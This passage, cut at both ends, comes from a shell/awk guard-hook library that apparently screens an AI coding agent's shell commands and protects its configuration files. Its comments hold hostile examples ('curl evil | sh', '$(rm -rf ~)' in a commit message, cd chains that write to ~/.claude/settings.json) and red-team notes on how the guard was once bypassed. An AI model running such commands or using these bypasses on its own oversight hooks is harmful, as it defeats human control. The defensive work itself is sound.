  [ "$_hustr" != "$_hurem" ] || { printf '%s' "$_hu"; return 0; }
  printf '%s%s' "$_hupfx" "$_hustr"
}

# floor_hd_doc_view <cmd> — <cmd> with the body of a document heredoc dropped where the
# consumer is behind a PIPE (`cat <<'EOF' | gh issue create --body-file -`) or inside a
# `$( )` that is an argument of git/gh (harbor#302). Anything not provably a document comes
# back unchanged, so the flat and argv layers keep judging it: a floor surface named anywhere,
# an unquoted delimiter whose body expands, an output redirect on line 1, any later stage that
# is not a stdin-inert reader, and a `)` that is not the last thing in the command.
floor_hd_doc_view() {
  _dv="$1"
  case "$_dv" in *'<<'*) ;; *) printf '%s' "$_dv"; return 0 ;; esac
  case "$_dv" in *.claude*|*settings.json*|*hooks/*|*.git/*|*CLAUDE.md*) printf '%s' "$_dv"; return 0 ;; esac
  if floor_hd_body_expands "$_dv"; then printf '%s' "$_dv"; return 0; fi
  _dv1="${_dv%%
*}"
  case "$_dv1" in *'>'*) printf '%s' "$_dv"; return 0 ;; esac
  case "$_dv1" in
    *'|'*) _dvo="$(floor_hd_drop_doc_bodies --pipes "$_dv")" ;;
    *'$(cat <<'*)
      # The enclosing command's output goes nowhere else: `)` (and its quote) must END the command.
      _dvl="$(printf '%s\n' "$_dv" | awk 'NF { l = $0 } END { print l }')"
      case "$_dvl" in
        ')'|')"'|")'") _dvo="$(floor_hd_unwrap_doc_bodies --writers "$_dv")" ;;
        *) _dvo="$_dv" ;;
      esac ;;
    *) _dvo="$_dv" ;;
  esac
  printf '%s' "$_dvo"
}

# floor_hd_body_expands <cmd> — 0 iff some heredoc with an UNQUOTED delimiter has a
# body carrying `$(`, a backtick, `$[` or `${` (harbor#782). POSIX expands such a
# body while building the heredoc, so `git commit -F - <<EOF` / `$(<cmd>)` / `EOF`
# RUNS <cmd>: that body is code, and no body-dropping may hide it. Double quotes
# are not tracked, so a `<<` inside one can only add a match (fail toward judging).
floor_hd_body_expands() {
  case "$1" in *'<<'*) ;; *) return 1 ;; esac
  printf '%s\n' "$1" | awk '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    # Queue every heredoc opened on a command line, then read bodies in order.
    function scan(s,   n, i, c, nx, q1, dw, dq, dash) {
      n = length(s); q1 = 0; i = 1
      while (i <= n) {
        c = substr(s, i, 1); nx = substr(s, i + 1, 1)
        if (q1) { if (c == "\047") q1 = 0; i++; continue }
        if (c == "\047") { q1 = 1; i++; continue }
        if (c == "\\") { i += 2; continue }
        if (c == "<" && substr(s, i, 3) == "<<<") { i += 3; continue }
        if (c == "<" && nx == "<") {
          i += 2; dash = 0
          if (substr(s, i, 1) == "-") { dash = 1; i++ }
          while (substr(s, i, 1) ~ /[ \t]/) i++
          dw = ""; dq = 0
          while (i <= n) {
            c = substr(s, i, 1)
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "\047" || c == "\"" || c == "\\") { dq = 1; i++; continue }
            dw = dw c; i++
          }
          if (dw != "") { NQ++; QD[NQ] = dw; QQ[NQ] = dq; QT[NQ] = dash }
          continue
        }
        i++
      }
    }
    {
      if (HEAD <= NQ && HEAD > 0) {
        x = $0; if (QT[HEAD]) sub(/^\t+/, "", x)
        if (x == QD[HEAD]) { HEAD++; if (HEAD > NQ) HEAD = 0; next }
        if (!QQ[HEAD] && ($0 ~ /\$[([{]/ || index($0, "`"))) { hit = 1; exit }
        next
      }
      before = NQ; scan($0)
      if (NQ > before) HEAD = before + 1
    }
    END { exit (hit ? 0 : 1) }'
}

# floor_hd_literalize_bodies <cmd> - <cmd> with every apostrophe and double quote INSIDE a heredoc body replaced by a space (harbor#805). A body is literal to the shell, but the normalizer reads the whole command as one shell string, so a lone `'` in a commit message opened a quote past the terminator and hid the body's own `$(...)` (`it's $(rm -rf ~)` reached exit 0).
# Substitutions, backticks and `${`/`$[` are LEFT intact, so an unquoted body that runs one is still judged; opener lines are untouched. The veto reads the ORIGINAL (FLOOR_SEG_CMD), so delimiter quoting is detected as written.
floor_hd_literalize_bodies() {
  case "$1" in *'<<'*) ;; *) printf '%s' "$1"; return 0 ;; esac
  _hlb="$(printf '%s\n' "$1" | awk '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    # scan(s) queues each heredoc opened on command line s and returns 1 iff s ends with its
    # quotes balanced and no trailing backslash — i.e. the logical line ended here, so the body
    # starts on the next physical line. A `<<x` inside "..." is not an opener (quote-aware).
    function scan(s,   n, i, c, nx, q1, dw, dash) {
      n = length(s); q1 = 0; i = 1
      while (i <= n) {
        c = substr(s, i, 1); nx = substr(s, i + 1, 1)
        if (q1) {
          if (c == "\\" && q1 == 2) { i += 2; continue }   # \" inside "..." does not close it
          if (c == "\047" && q1 == 1) q1 = 0; else if (c == "\"" && q1 == 2) q1 = 0
          i++; continue
        }
        if (c == "\047") { q1 = 1; i++; continue }
        if (c == "\"") { q1 = 2; i++; continue }
        if (c == "\\") { if (i == n) return -1; i += 2; continue }
        if (c == "<" && substr(s, i, 3) == "<<<") { i += 3; continue }
        if (c == "<" && nx == "<") {
          i += 2; dash = 0
          if (substr(s, i, 1) == "-") { dash = 1; i++ }
          while (substr(s, i, 1) ~ /[ \t]/) i++
          dw = ""
          while (i <= n) {
            c = substr(s, i, 1)
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "\047" || c == "\"" || c == "\\") { i++; continue }
            dw = dw c; i++
          }
          if (dw != "") { NQ++; QD[NQ] = dw; QT[NQ] = dash }
          continue
        }
        i++
      }
      return (q1 == 0) ? 1 : -1
    }
    { L[NR] = $0 }
    END {
      out = ""; sep = ""; i = 1
      while (i <= NR) {
        # Read the bodies of every heredoc queued on the logical line just scanned, in order.
        if (HEAD > 0 && HEAD <= NQ) {
          x = L[i]; if (QT[HEAD]) sub(/^\t+/, "", x)
          if (x == QD[HEAD]) { HEAD++; if (HEAD > NQ) HEAD = 0; out = out sep L[i]; sep = "\n"; i++; continue }
          y = L[i]; gsub(/[\047"]/, " ", y)   # a body line: quotes are literal here
          out = out sep y; sep = "\n"; i++; continue
        }
        # A command/opener line. If its quotes do not balance (harbor#784) body boundaries are ambiguous, so leave the WHOLE command untouched.
        before = NQ; bal = scan(L[i])
        if (bal != 1) { print_original(); exit }
        out = out sep L[i]; sep = "\n"; i++
        if (NQ > before) HEAD = before + 1
      }
      if (HEAD > 0) { print_original(); exit }   # a body with no terminator: untouched
      printf "%s", out
    }
    function print_original(   k) { for (k = 1; k <= NR; k++) printf "%s%s", (k > 1 ? "\n" : ""), L[k] }
  ')" || _hlb="$1"
  printf '%s' "$_hlb"
}

# floor_seg_unwrap <cmd-ERE> — append a synthetic segment wherever a word matching the
# lowercase <cmd-ERE> stands in argv behind a wrapper the peel does not know, walking
# until a text sink (harbor#715; docs/explanation/admission-baseline.md has the rule). Additive only; call it after
# floor_heredoc_inert_only, whose last-segment test a synthetic id would move.
floor_seg_unwrap() {
  [ -n "${FLOOR_SEGS:-}" ] || return 0
  _suwr=0
  while [ "$_suwr" -lt 3 ]; do
    _suwr=$((_suwr + 1))
    _suwo="$(printf '%s\n' "$FLOOR_SEGS" | _SUW_RE="$1" _SUW_ROUND="$_suwr" awk '
      # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
      function base(t) { sub(/.*\//, "", t); return tolower(t) }
      function stop(t) { return (base(t) ~ /^(echo|printf|grep|egrep|fgrep|rg|ag|ack|comm|man|which|whereis|whatis|apropos|type|tldr|find)$/) }
      function shell(t) { return (base(t) ~ /^(sh|bash|zsh|ksh|dash|ash|busybox)$/) }
      function idof(s,   p) { s = substr(s, 6); p = index(s, ":"); VAL = substr(s, p + 1); return substr(s, 1, p - 1) + 0 }
      BEGIN { RE = ENVIRON["_SUW_RE"]; ROUND = ENVIRON["_SUW_ROUND"] + 0 }
      /^SEGW:/ { id = idof($0); if (id > MAX) MAX = id; next }
      /^SEGC:/ { id = idof($0); CW[id] = VAL; if (id > MAX) MAX = id; next }
      /^SEGA:/ { id = idof($0); A[id, ++NA[id]] = VAL; next }
      /^SEGR:/ { id = idof($0); R[id, ++NR_[id]] = VAL; next }
      /^SEGU:/ { id = idof($0); DONE[id] = 1; next }
      END {
        nid = MAX
        for (id = 1; id <= MAX; id++) {
          if (!(id in CW) || (id in DONE)) continue
          c = CW[id]
          if (tolower(c) ~ RE || stop(c) || shell(c)) continue
          for (k = 1; k <= NA[id]; k++) {
            t = A[id, k]
            if (stop(t)) break
            if (tolower(t) ~ RE) {
              nid++
              print "SEGU:" id ":"
              print "SEGW:" nid ":" t
              print "SEGC:" nid ":" t
              for (m = k + 1; m <= NA[id]; m++) print "SEGA:" nid ":" A[id, m]
              for (m = 1; m <= NR_[id]; m++) print "SEGR:" nid ":" R[id, m]
              break
            }
            if (shell(t)) {
              for (m = k + 1; m <= NA[id]; m++) {
                if (A[id, m] ~ /^(-[a-zA-Z]*c|--command)$/) {
                  if (m < NA[id] && ROUND < 3) { print "SEGU:" id ":"; print "BODY:" A[id, m + 1] }
                  break
                }
                if (A[id, m] !~ /^-/) break
              }
              break
            }
          }
        }
      }' 2>/dev/null)" || return 0
    [ -n "$_suwo" ] || return 0
    _suwadd="$(printf '%s\n' "$_suwo" | "$FLOOR_GREP" -v '^BODY:' || true)"
    _suwmax="$(printf '%s\n' "$FLOOR_SEGS" "$_suwadd" | sed -n 's/^SEG[WC]:\([0-9][0-9]*\):.*/\1/p' | sort -n | tail -n 1)"
    _suwb="$(printf '%s\n' "$_suwo" | sed -n 's/^BODY://p')"
    if [ -n "$_suwb" ] && [ -f "$FLOOR_AWK" ]; then
      # Each body is its own command: normalized alone, ids moved above the table.
      _suwadd="$_suwadd
$(printf '%s\n' "$_suwb" | while IFS= read -r _suwl; do
          printf '%s' "$_suwl" | awk -f "$FLOOR_AWK" 2>/dev/null | "$FLOOR_GREP" '^SEG' \
            | awk -v off="${_suwmax:-0}" -v OFS=: -F: '{ n = $2 + off; $2 = n; if ($1 == "SEGF") $3 = $3 + off; print }'
          _suwmax=$(( ${_suwmax:-0} + 1000 ))
        done)"
    fi
    FLOOR_SEGS="$FLOOR_SEGS
$_suwadd"
    [ -n "$_suwb" ] || return 0
  done
  return 0
}

# floor_seg_flagval <cmd-ERE> <flag-name-ERE> <value-ERE> - exit 0 iff SOME segment runs a matching command AND carries that flag with an adjacent VALUE matching <value-ERE>, as `--flag value` or `--flag=value`.
# Adjacency needs its own helper: floor_seg_has asks whether a token is PRESENT, wrong for a flag whose meaning is the value after it (harbor#194: `bq update --expiration 0` REMOVES a timer, so a presence test asked for confirmation at the moment someone prevents data loss). absl-flags also accepts `--expiration=3600`; the name is split off so one ERE serves both.
# TWO DIRECTIONS OF USE, failing opposite ways; read this before adding a third caller. guard-cloud EXEMPTS with it (flag present AND value not the clearing one): an unrecognised or expanded value gives no match, the exemption is withheld, fails SAFE. guard-bash FIRES on it (harbor#196, an output flag whose value is a floor surface): an unrecognised value gives no match and the command is ALLOWED, fails OPEN, the direction every scanner here takes, with B1's permissions.deny underneath.
# The value is tested in BOTH spellings, raw and canonical path, so `~/.claude` and `$HOME/.claude` reach a rule written for the absolute form.
# ONE awk PASS OVER THE WHOLE TABLE, not one per segment (harbor#196's caller passes `.*`; 2000 segments went from 0.26s to 5s, P12-perf-04; latency is a fail-open bypass). The expansion is LAZY for the same reason: the pass reports matched; no such flag anywhere; or flag present but no raw match, and only the third is canonicalised and re-scanned.
# --short (harbor#788): a single-dash token is also read as getopt reads a bundle.
# The first letter whose `-<letter>` matches takes the rest of the token as its
# value, or the next token when it is last: `-so <v>`, `-sSLo <v>`, `-o<v>`.
# NO APOSTROPHES IN THIS PROGRAM: it is spliced into single-quoted awk below.
_FV_SHORT='
  function sv(t, nx, hasnx,   n, k, L) {
    if (!S || t !~ /^-[A-Za-z]/) return 0
    n = length(t)
    for (k = 2; k <= n; k++) {
      L = substr(t, k, 1)
      if (L !~ /[A-Za-z]/) return 0
      if (("-" L) ~ f) { SEEN = 1; if (k < n) return (substr(t, k + 1) ~ v); return (hasnx && nx ~ v) }
    }
    return 0
  }'
_floor_fv_scan() { # <arg-block> → 0 match · 1 no match   (used for the retry only)
  printf '%s\n' "$1" | awk -v f="$_fvf" -v v="$_fvv" -v S="$_fvs" "$_FV_SHORT"'
    { a[NR] = $0 }
    END {
      for (i = 1; i <= NR; i++) {
        t = a[i]; p = index(t, "=")
        if (p > 0) {
          if (substr(t, 1, p - 1) ~ f && substr(t, p + 1) ~ v) exit 0
        } else if (t ~ f && i < NR && a[i + 1] ~ v) exit 0
        if (sv(t, a[i + 1], i < NR)) exit 0
      }
      exit 1
    }'
}
floor_seg_flagval() { # <cmd-ERE> <flag-name-ERE> <value-ERE> [--short]
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _fvf="$2"; _fvv="$3"; _fvs=0
  [ "${4:-}" = --short ] && _fvs=1
  # The id is parsed by position rather than by field, because a command word or
  # an argument may itself contain a colon — `curl http://x` is the ordinary case.
  _fvout="$(printf '%s\n' "$FLOOR_SEGS" | awk -v c="$1" -v f="$_fvf" -v v="$_fvv" -v S="$_fvs" "$_FV_SHORT"'
    /^SEGC:/ { s = substr($0, 6); p = index(s, ":")
               id = substr(s, 1, p - 1) + 0
               if (substr(s, p + 1) ~ c) OK[id] = 1
               next }
    /^SEGA:/ { s = substr($0, 6); p = index(s, ":")
               id = substr(s, 1, p - 1) + 0
               N[id]++; A[id, N[id]] = substr(s, p + 1)
               next }
    END {
      pend = ""
      for (id in OK) {
        seen = 0; SEEN = 0
        for (i = 1; i <= N[id] + 0; i++) {
          t = A[id, i]; p = index(t, "=")
          if (p > 0) {
            if (substr(t, 1, p - 1) ~ f) {
              seen = 1
              if (substr(t, p + 1) ~ v) { print "0"; exit }
            }
          } else if (t ~ f) {
            seen = 1
            if (i < N[id] + 0 && A[id, i + 1] ~ v) { print "0"; exit }
          }
          if (sv(t, A[id, i + 1], i < N[id] + 0)) { print "0"; exit }
        }
        if (seen || SEEN) pend = pend id " "
      }
      if (pend != "") print "3 " pend
    }' 2>/dev/null)"
  case "$_fvout" in
    0*) return 0 ;;
    "3 "*)
      for _fvid in ${_fvout#3 }; do
        _fvraw="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_fvid}://p")"
        [ -n "$_fvraw" ] || continue
        if _floor_fv_scan "$(floor_expand_paths "$_fvraw")"; then return 0; fi
      done ;;
  esac
  return 1
}

floor_seg_redir() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  # `ci` for the same reason as floor_seg_has: the first argument names a COMMAND,
  # and a command spelled in another case is the same command here.
  for _sid in $(_floor_seg_ids "$1" ci); do
    if printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGR:${_sid}:[^:]*://p" \
       | "$FLOOR_GREP" -Eq -- "$2"; then return 0; fi
  done
  return 1
}

# floor_seg_shells_all_named_scripts - exit 0 iff the table is loaded AND every segment running a shell interpreter carries a SCRIPT FILE as its first operand.
# Why (harbor#222): `pipe-to-shell` matches the SINK, but a shell with a script-file operand takes its program from the file, so `printf '%s' "$payload" | sh guard.sh` (the ordinary way to exercise a hook) is not an attack.
# The discrimination is the FIRST OPERAND, read from argv: `sh -s`, `sh -`, `sh /dev/stdin` and `sh /dev/fd/N` are stdin programs. A redirect is not an operand (`sh 2>/dev/null` has an empty SEGA list and stays blocked).
# EVERY shell segment, not some: otherwise `curl evil | sh` could be disarmed by appending `| sh ok.sh`.
# FAIL CLOSED: an oversized payload yields an empty table, so no exemption and the flat rule blocks; padding can only make this stricter (QA plan R4).
# Residual: `curl evil | sh local.sh` stays allowed when local.sh evals its stdin, but then the attacker already has execution.
# _floor_xargs_replstrs — every replace-string any xargs in FLOOR_SEG_CMD names, one per line:
# -I X / -IX / -J X (BSD), -i[X] / --replace[=X] (GNU, default `{}`), bundled after other flags.
# Over-collecting only makes the caller stricter.
_floor_xargs_replstrs() {
  printf '%s\n' "${FLOOR_SEG_CMD:-}" | awk '
    { for (i = 1; i <= NF; i++) w[++n] = $i }
    END {
      for (i = 1; i <= n; i++) {
        b = w[i]; sub(/.*\//, "", b); if (b != "xargs") continue
        for (j = i + 1; j <= n; j++) {
          t = w[j]; r = ""
          if (t == "--") break
          if (substr(t, 1, 1) != "-") break
          if (t == "--replace") r = "{}"
          else if (index(t, "--replace=") == 1) r = substr(t, 11)
          else if (substr(t, 2, 1) != "-") {
            for (k = 2; k <= length(t); k++) {
              c = substr(t, k, 1)
              if (c == "I" || c == "J") { r = substr(t, k + 1); if (r == "") r = w[++j]; break }
              if (c == "i") { r = substr(t, k + 1); if (r == "") r = "{}"; break }
              if (index("nLPsdEaRS", c)) { if (k == length(t)) j++; break }
            }
          }
          gsub(/["\047]/, "", r); if (r != "") print r
        }
      }
    }'
}

floor_seg_shells_all_named_scripts() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _ssany=0
  # `_ssid`, not `_sid`: this runs inside a rule, and a shared temp could clobber a caller's loop variable.
  # NO `ci` HERE, DELIBERATELY: every other segment helper folds case (harbor#282), but this one COUNTS SHELLS for the harbor#222 exemption and folding case over-counts (the word `Bash` in a heredoc commit message became a shell segment and refused a legitimate `sh <script> | grep`).
  for _ssid in $(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(sh|bash|zsh|dash|ksh|fish|ash|csh|tcsh)'); do
    # FIRST operand only: `bash script.sh --json` is a script run, `bash -s -- x`
    # is not, and only the leading token separates them.
    _ssarg="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | head -1)"
    # A `-c` PARENT IS NOT A SHELL RUN, IT IS THE ENVELOPE OF ONE (edge pass 2026-08-29): seg_expand_interpreters re-tokenizes a `-c` payload into child segments, so the shells that actually run appear on their own and the parent is skipped. Children answer for themselves (`sh -c 'curl ... | sh'` expands to a bare `sh` with NO operand, refused by the `[ -n "$_ssarg" ]` arm below). Only `-c` and its bundled spellings are skipped; `sh -s -- x` must keep disqualifying.
    # `-c` is spelled out separately because this is a `case` GLOB: `-[a-zA-Z]*c` needs a letter BEFORE the c and misses the bare `-c`.
    # A `-c` SHELL IS ITSELF A PROGRAMMED RUN (inst-quiet-predicates): its program is the code ARGUMENT and the pipe is only stdin, so it counts as exempt unless its code turns stdin back into code: no code, a code argument that IS a substitution (`sh -c "$(cat)"`), `eval`/`source`/`.` anywhere, or a stdin path in the code. An un-expanded parent (no SEGI child next) is not counted.
    # NOT when xargs splices the pipe INTO the code (`... | xargs -I{} sh -c '{}'`): code holding any xargs replace-string refuses. The placeholder as an ARGUMENT (`sh -c 'gh run view "$0"' {}`) stays exempt.
    case "$_ssarg" in
      -c|-[a-zA-Z]*c)
        _sscode="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | sed -n 2p)"
        [ -n "$_sscode" ] || return 1
        _ssnext="$(printf '%s\n' "$FLOOR_SEGS" | sed -n 's/^SEGC:\([0-9][0-9]*\):.*/\1/p' \
          | awk -v s="$_ssid" '$1 + 0 > s + 0' | sort -n | head -1)"
        if [ -z "$_ssnext" ] || ! printf '%s\n' "$FLOOR_SEGS" | "$FLOOR_GREP" -q -- "^SEGI:${_ssnext}:"; then
          continue
        fi
        case "$_sscode" in *@SUB@*|*'`'*) return 1 ;; esac
        if printf '%s\n' "$_sscode" | "$FLOOR_GREP" -Eq -- '(^|[^[:alnum:]_-])(eval|source)([^[:alnum:]_-]|$)|(^|[;&|(])[[:space:]]*\.[[:space:]]|/+dev/+(stdin|fd)|/+proc/'; then
          return 1
        fi
        [ -z "$(_floor_seg_ids '(eval|source|\.)')" ] || return 1
        case "${FLOOR_SEG_CMD:-}" in *xargs*)
          while IFS= read -r _ssr; do
            [ -z "$_ssr" ] || case "$_sscode" in *"$_ssr"*) return 1 ;; esac
          done <<XARGS_EOF
$(_floor_xargs_replstrs)
XARGS_EOF
          ;;
        esac
        # A bare interpreter in the code (`sh -c 'python3'`) reads the pipe as ITS program.
        if [ -n "$(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(python[0-9.]*|pypy[0-9.]*|perl|ruby|node|nodejs|php|lua|luajit|osascript)')" ] \
           && ! floor_seg_interps_all_programmed; then return 1; fi
        _ssany=1
        continue ;;
    esac
    [ -n "$_ssarg" ] || return 1
    # harbor#1420: options before the script (`sh -x s.sh`, `sh -e s.sh`) do not move the program
    # to stdin. Walk to the first OPERAND; a code/stdin flag (c, s) or a bare `-` still refuses.
    _ssop="$(_floor_sh_first_operand "$_ssid")" || return 1
    case "$_ssop" in
      ''|-|-*|/dev/stdin|/dev/fd/*) return 1 ;;
    esac
    _ssany=1
  done
  [ "$_ssany" = 1 ] || return 1
  return 0
}

# _floor_sh_first_operand <seg-id> — print the first operand of a shell segment, skipping options
# and the values of the ones that take one (-o X, -O X, --rcfile F, --init-file F). Exit 1 when an
# option makes stdin the program (-s, -c, bundled too) or no operand exists.
_floor_sh_first_operand() {
  _sfskip=0; _sfdd=0
  for _sfa in $(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${1}://p" | tr ' \t' '\n\n'); do
    if [ "$_sfskip" = 1 ]; then _sfskip=0; continue; fi
    if [ "$_sfdd" = 1 ]; then printf '%s\n' "$_sfa"; return 0; fi
    case "$_sfa" in
      --) _sfdd=1 ;;
      --rcfile|--init-file) _sfskip=1 ;;
      --*) ;;
      -) printf '%s\n' -; return 0 ;;
      -*c*|-*s*|+*c*|+*s*) return 1 ;;
      -*o*|-*O*|+*o*|+*O*) _sfskip=1 ;;
      -*|+*) ;;
      *) printf '%s\n' "$_sfa"; return 0 ;;
    esac
  done
  return 1
}

# floor_seg_all_inert [<own-cmd-ERE>] — exit 0 iff the table is loaded and EVERY segment's command is
# an inert text consumer (its arguments are data, never a program) or matches <own-cmd-ERE>.
# harbor#1420: a flat rule's hit is acquitted only on this proof, so a regex alternation in a grep
# pattern (`'(sed|python3|perl)'`) is not read as a pipe into an interpreter. Fails closed: no table, an
# unknown command, an executor or a path outside the system bin dirs all answer 1. The inert set is
# deliberately small; a segment outside it keeps the flat verdict.
floor_seg_all_inert() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  printf '%s\n' "$FLOOR_SEGS" | awk -v own="${1:-}" '
    /^SEGC:/ { c = $0; sub(/^SEGC:[0-9]+:/, "", c); n++
      if (c !~ /^((\/usr)?(\/local)?\/bin\/|\/opt\/homebrew\/bin\/)?(echo|printf|grep|egrep|fgrep|rg|ag|ack|sort|uniq|wc|head|tail|cut|tr|cat|comm|basename|dirname)$/ \
          && (own == "" || c !~ own)) bad = 1 }
    END { exit (n > 0 && !bad) ? 0 : 1 }'
}

# floor_seg_flat_clear <cmd-ERE> <danger-ERE> — exit 0 iff the table proves a flat hit is text beside the
# command rather than inside it: some segment runs <cmd-ERE>, none of those segments' own arguments
# match <danger-ERE> or carry a substitution, and every other segment is an inert text consumer.
# harbor#1420 §6: the flat regex of python-c-exec read `eval(` in an echo as the python code.
floor_seg_flat_clear() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _fcany=0
  for _fcid in $(_floor_seg_ids "$1"); do
    _fcany=1
    _fcargs="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_fcid}://p" | tr '\n' ' ')"
    case "$_fcargs" in *@SUB@*|*'`'*) return 1 ;; esac
    printf ' %s\n' "$_fcargs" | "$FLOOR_GREP" -iEq -- "$2" && return 1
  done
  [ "$_fcany" = 1 ] || return 1
  floor_seg_all_inert "^($1)\$"
}

# floor_seg_interps_all_programmed - exit 0 iff the table is loaded AND every segment running a non-shell interpreter (python, perl, ruby, node, php, lua, osascript) brings its own program: a script operand or a code/module flag (harbor#1313). Sibling of floor_seg_shells_all_named_scripts for interpreters that, run bare or with `-`, execute what arrives on the pipe.
# AN ARGV WALK, IN ORDER; the first decisive word wins (`python - x.py` is a stdin program, `python x.py -` a script). A stdin path or `-` is the sink; a code flag (-c/-m python, -e/-E perl, -e ruby/lua/osascript, -e/-p node, -r/-f php, glued or bundled) or a non-dash word is a program. Options alone decide nothing. Residual: an option VALUE reads as a script word (`python -W ignore`).
# EVERY interpreter segment, fail closed: no table means no exemption.
floor_seg_interps_all_programmed() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _ipany=0
  for _ipid in $(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(python[0-9.]*|pypy[0-9.]*|perl|ruby|node|nodejs|php|lua|luajit|osascript)'); do
    _ipcmd="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGC:${_ipid}://p" | head -1)"
    _ipcmd="${_ipcmd##*/}"
    _ipprog=0
    for _ipa in $(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ipid}://p" | tr ' \t' '\n\n'); do
      case "$_ipa" in
        -|/*dev/*stdin|/*dev/*fd/*) return 1 ;;
      esac
      case "$_ipcmd:$_ipa" in
        python*:-c*|python*:-m*|python*:-[a-zA-Z]*[cm]|pypy*:-c*|pypy*:-m*|pypy*:-[a-zA-Z]*[cm]) _ipprog=1 ;;
        perl:-e*|perl:-E*|perl:-[a-zA-Z]*[eE]|ruby:-e*|ruby:-[a-zA-Z]*e) _ipprog=1 ;;
        lua*:-e*|osascript:-e*|node*:-e*|node*:-p*|node*:--eval*|node*:--print*) _ipprog=1 ;;
        php:-r*|php:-f*|php:-[a-zA-Z]*[rf]) _ipprog=1 ;;
        *:-*) ;;
        *) _ipprog=1 ;;
      esac
      [ "$_ipprog" = 1 ] && break
    done
    [ "$_ipprog" = 1 ] || return 1
    _ipany=1
  done
  [ "$_ipany" = 1 ] || return 1
  return 0
}

# floor_seg_cwd_under <dir> [<dir> ...] - exit 0 iff FOLDING this command's cd/pushd chain lands the working directory AT or BELOW one of <dir>.
# The one-hop sticky-cd trigger was bypassed by `cd ~ && cd .claude && echo {} > settings.json`, the `;` spelling and `pushd ~ && cd .claude && ...` (pass 13, P13-fs-01). The question is WHERE THE COMMAND IS STANDING when the mutating segment runs, so the segment table's ordered command words are folded as the shell does and PATHS ARE COMPARED BY COMPONENT (which also keeps `cd ~/.claude-notes` out; red-team pass 6).
# UNKNOWN IS NOT "INSIDE": a hook is never told the real cwd, so the fold goes blind at anything it cannot resolve (`cd -`, a substitution, a glob, an unanchored relative hop). That is the fail-open direction of every scanner here; the caller keeps its flat trigger for oversized payloads.
floor_seg_cwd_under() { # <dir> [<dir> …]
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  [ "$#" -gt 0 ] || return 1
  # No `cd`/`pushd` anywhere means nothing to fold: a `case` is a builtin and the awk is a fork, and latency is a fail-open bypass (pass 12).
  case "$FLOOR_SEGS" in *cd*|*pushd*) ;; *) return 1 ;; esac
  # The directories arrive as INPUT LINES, not as `-v` assignments: awk runs
  # escape processing over a -v value, so a home directory carrying a backslash
  # would reach the comparison as a different string than the one on disk.
  { printf 'CFGD:%s\n' "$@"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    # Lexical only, and deliberately so: this resolves a path the command has
    # not yet visited, so there is nothing on disk to stat.
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/")
      n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""
      for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      if (r == "") r = lead ? "/" : ""
      return r
    }
    function resolve(t, c) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") return home
      if (substr(t, 1, 2)  == "~/")       return norm(home substr(t, 2))
      if (substr(t, 1, 6)  == "$HOME/")   return norm(home substr(t, 6))
      if (substr(t, 1, 8)  == "${HOME}/") return norm(home substr(t, 8))
      if (substr(t, 1, 1)  == "/")        return norm(t)
      # `~alice/…` is the home of a SECOND ACCOUNT on a shared host.
      # Unresolvable here, but the shape alone identifies that config dir — the
      # spelling pass 13 measured reaching every other surface rule at exit 0.
      if (t ~ /^~[A-Za-z_][A-Za-z0-9_.-]*(\/|$)/) return norm(t)
      # A substitution, a variable or a glob names a directory this parser does
      # not know. Blind, never guessed.
      if (index(t, "@SUB@") || index(t, "$") || index(t, "`") || t ~ /[*?]/) return ""
      if (c == "") return ""
      return norm(c "/" t)
    }
    function inside(p,   i) {
      for (i = 1; i <= nd; i++)
        if (p == D[i] || index(p, D[i] "/") == 1) return 1
      return (p ~ /^~[A-Za-z_][A-Za-z0-9_.-]*\/\.claude(\/|$)/)
    }
    /^CFGD:/ { d = substr($0, 6); sub(/\/+$/, "", d); if (d != "") D[++nd] = d; next }
    /^SEGC:/ { n = $0; sub(/^SEGC:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGC:[0-9]+:/, "", v)
               C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0; next }
    # Args accumulate newline-separated. Segment ids are not contiguous — a
    # subshell consumes one — so the fold walks 1..MAX and skips the holes.
    /^SEGA:/ { n = $0; sub(/^SEGA:/, "", n); sub(/:.*/, "", n)
               v = $0; sub(/^SEGA:[0-9]+:/, "", v)
               A[n + 0] = A[n + 0] "\n" v; if (n + 0 > MAX) MAX = n + 0; next }
    END {
      if (nd == 0) exit 1
      cwd = ""
      for (k = 1; k <= MAX; k++) {
        w = C[k]; if (w == "") continue
        sub(/.*\//, "", w)
        # popd unwinds a stack this parser never saw; the shell knows where it
        # lands and we do not.
        if (w == "popd") { cwd = ""; continue }
        if (w != "cd" && w != "pushd") continue
        t = ""; got = 0
        m = split(A[k], ar, "\n")
        for (j = 1; j <= m; j++) {
          if (ar[j] == "" || ar[j] == "--") continue
